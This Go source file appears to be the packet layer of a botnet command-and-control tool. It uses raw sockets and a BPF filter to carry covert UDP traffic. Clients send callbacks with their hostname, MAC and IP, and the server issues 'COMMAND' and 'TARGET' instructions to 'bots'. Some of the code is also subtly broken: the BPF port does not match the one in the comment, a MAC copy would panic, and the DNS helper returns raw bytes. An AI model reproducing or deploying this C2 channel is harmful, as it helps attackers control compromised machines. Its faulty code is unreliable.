package socket

import (
	"bufio"
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	"golang.org/x/net/bpf"
	"golang.org/x/sys/unix"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// FilterRaw is a BPF struct containing raw instructions.
// Generate with tcpdump udp and port 56969 -dd
// or whatever filter you would like to generate
var FilterRaw = []bpf.RawInstruction{
	{ 0x28, 0, 0, 0x0000000c },
	{ 0x15, 0, 9, 0x00000800 },
	{ 0x30, 0, 0, 0x00000017 },
	{ 0x15, 0, 15, 0x00000011 },
	{ 0x28, 0, 0, 0x00000014 },
	{ 0x45, 13, 0, 0x00001fff },
	{ 0xb1, 0, 0, 0x0000000e },
	{ 0x48, 0, 0, 0x0000000e },
	{ 0x15, 9, 0, 0x000015a6 },
	{ 0x48, 0, 0, 0x00000010 },
	{ 0x15, 7, 8, 0x000015a6 },
	{ 0x15, 0, 7, 0x000086dd },
	{ 0x30, 0, 0, 0x00000014 },
	{ 0x15, 0, 5, 0x00000011 },
	{ 0x28, 0, 0, 0x00000036 },
	{ 0x15, 2, 0, 0x000015a6 },
	{ 0x28, 0, 0, 0x00000038 },
	{ 0x15, 0, 1, 0x000015a6 },
	{ 0x6, 0, 0, 0x00040000 },
	{ 0x6, 0, 0, 0x00000000 },
}

// Function to do this err checking repeatedly
func checkEr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// htons converts a short (uint16) from host-to-network byte order.
// #Stackoverflow
func htons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}

// GetRouterMAC gets the default gateway MAC addr from the system
//
// Returns 	--> MAC addr of the gateway of type net.HardwareAddr
//
// Credit: Milkshak3s & Cictrone
func GetRouterMAC() (net.HardwareAddr, error) {
	// get the default gateway address from routes
	gatewayAddr := ""
	fRoute, err := os.Open("/proc/net/route")
	if err != nil {
		return nil, err
	}
	defer fRoute.Close()

	s := bufio.NewScanner(fRoute)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[1] == "00000000" {
			decode, err := hex.DecodeString(fields[2])
			if err != nil {
				return nil, err
			}

			gatewayAddr = fmt.Sprintf("%v.%v.%v.%v", decode[3], decode[2], decode[1], decode[0])
		}
	}

	if gatewayAddr == "" {
		return nil, errors.New("No gateway found in routes")
	}

	// look through arp tables for match to gateway address
	fArp, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	defer fArp.Close()

	s = bufio.NewScanner(fArp)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[0] == gatewayAddr {
			return net.ParseMAC(fields[3])
		}
	}

	return nil, errors.New("No gateway found")
}

func readPacket(fd int, buf []byte) (int, error) {
	n, _, err := unix.Recvfrom(fd, buf, 0)
	if err != nil {
		if errors.Is(err, unix.EAGAIN) || errors.Is(err, unix.EINTR) {
			return 0, nil // transient, no data this time
		}
		return 0, fmt.Errorf("recvfrom fatal: %w", err)
	}
	return n, nil
}

// ServerReadPacket reads packets from a socket file descriptor (fd)
//
// fd  	--> file descriptor that relates to the socket created in main
// vm 	--> BPF VM that contains the BPF Program
//
// Returns 	--> None
func ServerReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, error) {

	// Buffer for packet data that is read in
	buf := make([]byte, 1500)

	// Read in the packets
	// Basically, read packet will check if we got any transient errors (things that dont matter, google the error codes)
	// Then, it will return 0 if it was transient, or the error if it wasnt. Otherwise, itll
	// return how much data was actually read by the server to prevent any segfaults
	n, err := readPacket(fd, buf)
	if err != nil {
		return nil, err
	}
	if n == 0 {
		return nil, nil // no data (transient error case)
	}
	data := buf[:n]

	// Filter packet?
	// numBytes	--> Number of bytes
	// err	--> Error you say?
	numBytes, err := vm.Run(data)
    if err != nil {
        return nil, fmt.Errorf("bpf filter failed: %w", err)
    }
	if numBytes == 0 {
		return nil, nil // numBytes == 0 means filter rejected the packet
	}

	// Parse only the bytes actually produced
	packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)

	// Make sure we are actually operating on the UDP layer
	if packet.Layer(layers.LayerTypeUDP) != nil {
		// Make sure this is a packet from client
		app := packet.ApplicationLayer()
		if app == nil {
			// No payload at application layer means we should drop the packet.
			return nil, nil
		}
		payload := string(app.Payload())

		// Check for the flags we accept in the server
		if strings.Contains(payload, "CLIENT") {
			return packet, nil
		} else if strings.Contains(payload, "HEARTBEAT") {
			return packet, nil
		}
	}
	// Default drop
	return nil, nil
}

// ClientReadPacket reads packets from a socket file descriptor (fd)
//
// fd  	--> file descriptor that relates to the socket created in main
// vm 	--> BPF VM that contains the BPF Program
//
// Returns 	--> None
func ClientReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {

	// Buffer for packet data that is read in
	buf := make([]byte, 1500)

	// Read in the packets
	// Basically, read packet will check if we got any transient errors (things that dont matter, google the error codes)
	// Then, it will return 0 if it was transient, or the error if it wasnt. Otherwise, itll
	// return how much data was actually read by the server to prevent any segfaults
	n, err := readPacket(fd, buf)
	if err != nil {
		// log and drop instead of returning an error
		log.Printf("Client read error: %v", err)
		return nil, false
	}
	if n == 0 {
		log.Printf("Client recieved transient error")
		return nil, false
	}
	data := buf[:n]

	// Filter packet?
	// numBytes	--> Number of bytes
	// err	--> Error 
	numBytes, err := vm.Run(data)
	checkEr(err)
	if numBytes == 0 {
		return nil, false // 0 means that the packet should be dropped becaulse filter rejected it
	}

	// Parse packet... hopefully
	packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
	if packet.Layer(layers.LayerTypeUDP) != nil {
		app := packet.ApplicationLayer()
		if app == nil {
			return nil, false
		}
		payload := string(app.Payload())

		// Make sure this is my packet
		if strings.Contains(payload, "COMMAND") {
			return packet, false
		} else if strings.Contains(payload, "TARGET") {
			return packet, true
		}
		return nil, false
	}
	return nil, false
}

// CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
//	for binding the socket to an interface
//
// ifaceInfo	--> net.Interface pointer
//
// Returns		--> syscall.SockaddrLinklayer struct
func CreateAddrStruct(ifaceInfo *net.Interface) (addr unix.SockaddrLinklayer) {
	// Create a byte array for the MAC Addr
	var haddr [8]byte

	// Copy the MAC from the interface struct in the new array
	copy(haddr[0:7], ifaceInfo.HardwareAddr[0:7])

	// Initialize the Sockaddr struct
	addr = unix.SockaddrLinklayer{
		Protocol: unix.ETH_P_IP,
		Ifindex:  ifaceInfo.Index,
		Halen:    uint8(len(ifaceInfo.HardwareAddr)),
		Addr:     haddr,
	}

	return addr
}

// SendPacket sends a packet using a provided
//	socket file descriptor (fd)
//
// fd 			--> The file descriptor for the socket to use
// ifaceInfo	--> pointer to net.Interface struct
// addr			--> struct from CreateAddrStruct()
// packetdata	--> The packet to send
//
// Returns 	--> None
func SendPacket(fd int, ifaceInfo *net.Interface, addr unix.SockaddrLinklayer, packetData []byte) {

	// Bind the socket
	checkEr(unix.Bind(fd, &addr))

	_, err := unix.Write(fd, packetData)
	checkEr(err)
}

// CreatePacket takes a net.Interface pointer to access
// 	things like the MAC Address... and yeah... the MAC Address
//
// ifaceInfo	--> pointer to a net.Interface
//
// Returns		--> Byte array that is a properly formed/serialized packet
func CreatePacket(ifaceInfo *net.Interface, srcIp net.IP,
	dstIP net.IP, srcPort int, dstPort int, dstMAC net.HardwareAddr, payload string) (packetData []byte) {

	// Buffer to building our packet
	buf := gopacket.NewSerializeBuffer()

	// Generate options
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// Ethernet layer
	ethernet := &layers.Ethernet{
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       ifaceInfo.HardwareAddr,
		DstMAC:       dstMAC,
	}
	// IPv4 layer
	ip := &layers.IPv4{
		Version:    0x4,
		IHL:        5,
		TTL:        255,
		Flags:      0x40, // 0100 0000 DNF
		FragOffset: 0,
		Protocol:   unix.IPPROTO_UDP, // Sending a UDP Packet
		DstIP:      dstIP,            //net.IPv4(),
		SrcIP:      srcIp,            //net.IPv4(),
	}
	// UDP layer
	udp := &layers.UDP{
		SrcPort: layers.UDPPort(srcPort), // No Random Port
		DstPort: layers.UDPPort(dstPort), // Saw this used in some code @github... seems legit
	}

	// Checksum calculations
	udp.SetNetworkLayerForChecksum(ip)

	checkEr(gopacket.SerializeLayers(buf, opts, ethernet, ip, udp, gopacket.Payload(payload)))

	// Save the newly formed packet and return it
	packetData = buf.Bytes()

	return packetData
}

// CreateBPFVM creates a BPF VM that contains a BPF program
// 	given by the user in the form of "[]bpf.RawInstruction".
// You can create this by using "tcpdump -dd [your filter here]"
//
// filter	--> Raw BPF instructions generated from tcpdump
//
// Returns	--> Pointer to a BPF VM containing the filter/program
func CreateBPFVM(filter []bpf.RawInstruction) (vm *bpf.VM) {

	// Disassemble the raw instructions so we can pass them to a VM
	insts, allDecoded := bpf.Disassemble(filter)
	if allDecoded != true {
		log.Fatal("Error decoding BPF instructions...")
	}

	vm, err := bpf.NewVM(insts)
	checkEr(err)

	return vm
}

// NewSocket creates a new RAW socket and returns the file descriptor
//
// Returns --> File descriptor for the raw socket
func NewSocket() (fd int) {

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
	checkEr(err)

	return fd
}

// GetOutboundIP finds the outbound IP addr for the machine
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> IP address in form "XXX.XXX.XXX.XXX"
func getOutboundIP(addr string) net.IP {
	conn, err := net.Dial("udp", addr)
	checkEr(err)

	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

func GetIpv4FromDns(ARecord string) (addr string) {
    ips, _ := net.LookupIP(ARecord)
    for _, ip := range ips {
        if ipv4 := ip.To4(); ipv4 != nil {
            return string(ipv4)
        }
    }
	return ""
}

// GetOutwardIface determines the interface associated with
// sending traffic out on the wire and returns a *net.Interface struct
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> *net.Interface struct of outward interface
//			--> net.IP used for creating a packet
func GetOutwardIface(addr string) (byNameiface *net.Interface, ip net.IP) {
	outboundIP := getOutboundIP(addr)

	ifaces, err := net.Interfaces()
	checkEr(err)

	for _, i := range ifaces {

		byNameiface, err := net.InterfaceByName(i.Name)
		checkEr(err)

		addrs, _ := byNameiface.Addrs()

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if bytes.Compare(outboundIP, ipnet.IP.To4()) == 0 {
					ip := ipnet.IP.To4()
					return byNameiface, ip
				}
			}
		}
	}

	return
}

// CreateHello creates a HELLO string for callbacks
// HELLO format:
//
//	HELLO: hostname hostMAC hostIP
//
//	*NOTE* hostMAC and hostIP will end up being the MAC/IP of the gateway
//			we are dealing with NAT. This will be handled by the C2 parsing
func GenerateClientMessage(hostMAC net.HardwareAddr, srcIP net.IP, data string) (message string) {
	hostname, err := os.Hostname()
	if err != nil {
		log.Fatal("Hostname not found...")
	}

	message = "CLIENT:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String() + " " + data
	lastByte := min(len(message), 508) //  RFC 791 - RTFM
	message = message[:lastByte]

	return message
}

func GenerateClientHeartbeat(hostMAC net.HardwareAddr, srcIP net.IP) (message string) {
	hostname, err := os.Hostname()
	if err != nil {
		log.Fatal("Hostname not found...")
	}

	message = "HEARTBEAT:" + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()

	return message
}

// CreateCommand creates the payload for sending commands to bots
func CreateCommand(cmd string) (command string) {
	command = "COMMAND: " + cmd
	return command
}

// CreateTargetCommand creates a target command string
func CreateTargetCommand(cmd string, ip string) (command string) {
	command = "TARGET: " + ip + " " + cmd
	return command
}
